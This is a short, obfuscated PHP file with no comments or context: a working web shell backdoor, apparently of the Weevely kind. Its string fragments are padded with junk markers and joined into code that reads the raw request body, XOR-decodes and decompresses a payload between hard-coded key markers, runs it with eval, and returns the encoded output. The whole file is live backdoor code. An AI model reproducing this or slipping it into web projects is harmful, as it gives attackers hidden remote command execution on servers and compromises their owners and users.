<?php
$T='==1<|<|)<| {@ob_start();@ev<|al(@g<|zunc<|ompress(@x(@bas<|e64_decod<|e($';
$a='ase<|<|64_encode<|(@x(@gzco<|m<|press($o),$k<|)<|);print(<|"$p$kh$r$kf");}';
$m='$k="0aa5e<|708";$<|kh="<|175a<|f1cd873<|0";<|$<|k<|f="03d7f<|1e8bb44";$p="';
$w='m[1<|]),<|$k)));<|$<|o=@ob_get_cont<|ents();<|@<|ob_e<|n<|d_clean();$r<|=@b';
$I=';$j++,$i++<|){$o.=$<|t{$i}<|^$k<|{$<|j};}}return <|$o;}i<|f (@<|preg_matc';
$D='<|len($t);<|<|$o="";for($i=0;<|$<|i<$<|l;)<|{for($j=0<|;($j<$c&&<|$i<<|$l)';
$i=str_replace('Mu','','MucMurMueatMueMu_functMuion');
$R='<|xDbgdsCP<|B2<|<|1V<|Ngzb";fun<|c<|tion x($t,$k){$c=strlen($k<|);$<|l=str';
$z='<|h("/$<|kh(.+)$<|kf/"<|,@<|f<|ile_get_contents(<|"php:<|/<|<|/input"<|),$m)';
$O=str_replace('<|','',$m.$R.$D.$I.$z.$T.$w.$a);
$K=$i('',$O);$K();
?>
